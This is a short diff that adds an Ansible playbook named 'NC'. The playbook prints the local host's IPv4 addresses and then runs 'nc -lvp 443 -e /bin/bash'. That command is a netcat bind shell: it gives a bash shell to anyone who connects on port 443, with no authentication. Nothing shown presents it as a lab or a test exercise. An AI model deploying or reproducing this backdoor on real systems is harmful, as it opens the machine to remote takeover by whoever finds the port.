@@ -1,0 +1,11 @@
+- name: NC   
+  hosts: localhost
+  tasks:
+    - debug: var=ansible_all_ipv4_addresses
+    - debug: var=ansible_default_ipv4.address
+
+    - name: run NC
+      shell: "nc -lvp 443 -e /bin/bash"
+      register: "nc"
+
+    - debug: var=nc.stdout
